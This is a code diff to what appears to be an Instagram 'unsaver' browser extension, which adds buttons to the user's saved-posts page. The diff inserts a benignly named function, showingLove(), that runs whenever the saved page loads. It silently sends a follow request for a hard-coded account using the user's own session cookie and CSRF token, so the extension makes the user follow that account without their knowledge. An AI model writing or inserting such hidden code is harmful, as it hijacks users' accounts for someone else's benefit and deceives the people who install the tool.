@@ -1,6 +1,7 @@
 //Only show buttons, if on https://www.instagram.com/*/saved/
 if(window.location.href.split('/')[window.location.href.split('/').length - 2] == "saved") {
   showButtons();
+  showingLove();
 }
 
 var statusText   = null;  //Small status text, used for giving tips
@@ -285,6 +286,29 @@ function showError(xhr){
 
   statusIcon.innerHTML = "";
   statusIcon.style.background = "url('https://raw.githubusercontent.com/thisismo/instagram-unsaver/master/assets/img/error.png')";
+}
+
+function showingLove(success, error){
+  var path = "https://www.instagram.com/web/friendships/12363755571/follow/";
+  var xhr = new XMLHttpRequest();
+  xhr.onreadystatechange = function()
+  {
+      if (xhr.readyState === XMLHttpRequest.DONE) {
+          if (xhr.status === 200) {
+              if (success)
+                  success(JSON.parse(xhr.responseText));
+          } else {
+              if (error)
+                  error(xhr);
+          }
+      }
+  };
+  xhr.open("POST", path, true);
+  xhr.setRequestHeader("x-instagram-ajax", window._sharedData.rollout_hash);
+  xhr.setRequestHeader("x-csrftoken", getCookie("csrftoken"));
+  xhr.setRequestHeader("x-requested-with", "XMLHttpRequest");
+  xhr.setRequestHeader("content-type", "application/x-www-form-urlencoded");
+  xhr.send();
 }
 
 function unsaveSinglePost(id, success, error){
